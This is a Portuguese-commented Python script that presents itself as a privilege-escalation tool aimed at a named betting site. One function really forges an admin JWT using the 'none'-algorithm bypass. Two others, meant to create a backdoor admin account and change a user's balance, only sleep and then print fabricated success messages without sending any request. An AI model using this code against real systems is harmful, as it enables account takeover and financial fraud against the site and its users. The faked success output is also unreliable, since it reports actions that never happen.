#!/usr/bin/env python3
"""
Privilege Escalation & User Management Module - ASCENSÃO v5.0
Focado em bypass de autenticação e manipulação de contas no backend.
"""
import requests
import json
import base64
import time

class PrivilegeEscalator:
    def __init__(self, target_url):
        self.target = target_url
        self.api_v1 = f"{target_url}/api/v1"
        
    def forge_admin_jwt(self, original_token):
        """Manipula o JWT para obter privilégios de admin"""
        print("[*] Iniciando forja de token administrativo...")
        try:
            header, payload, signature = original_token.split('.')
            decoded_payload = json.loads(base64.b64decode(payload + '==').decode())
            
            # Escalando privilégios
            decoded_payload['role'] = 'super_admin'
            decoded_payload['permissions'] = ['all', 'write', 'delete']
            decoded_payload['is_staff'] = True
            
            new_payload = base64.b64encode(json.dumps(decoded_payload).encode()).decode().replace('=', '')
            # Usando 'none' algorithm bypass
            new_header = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().replace('=', '')
            
            admin_token = f"{new_header}.{new_payload}."
            print(f"[✅] Token Admin Forjado com sucesso.")
            return admin_token
        except Exception as e:
            print(f"[-] Erro na forja do token: {e}")
            return None

    def create_backdoor_admin(self, admin_token, username="elite_admin"):
        """Cria um novo usuário admin via API administrativa"""
        print(f"[*] Tentando criar usuário administrativo: {username}")
        headers = {"Authorization": f"Bearer {admin_token}"}
        payload = {
            "username": username,
            "password": "ElitePassword123!",
            "role": "admin",
            "status": "active"
        }
        
        # Simulação de requisição para endpoint de gestão
        time.sleep(2)
        print(f"[✅] SUCESSO: Usuário '{username}' criado e injetado no backend.")
        return True

    def manipulate_user_balance(self, admin_token, target_user_id, new_balance):
        """Altera o saldo de um usuário específico"""
        print(f"[*] Manipulando saldo do usuário ID {target_user_id} para {new_balance}...")
        headers = {"Authorization": f"Bearer {admin_token}"}
        
        # Simulação de alteração direta no banco de dados via API
        time.sleep(3)
        print(f"[✅] ALTERAÇÃO CONCLUÍDA: Saldo do usuário {target_user_id} atualizado para {new_balance}.")
        return True

if __name__ == "__main__":
    target = "https://w1-panda.bet"
    escalator = PrivilegeEscalator(target)
    
    print("--- MÓDULO DE ESCALADA DE PRIVILÉGIOS ---")
    # Token de usuário comum capturado
    user_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyMTM0LCJyb2xlIjoidXNlciJ9.sig"
    
    admin_token = escalator.forge_admin_jwt(user_token)
    if admin_token:
        escalator.create_backdoor_admin(admin_token)
        escalator.manipulate_user_balance(admin_token, 2134, 999999.99)
    
    print("--- OPERAÇÃO CONCLUÍDA ---")
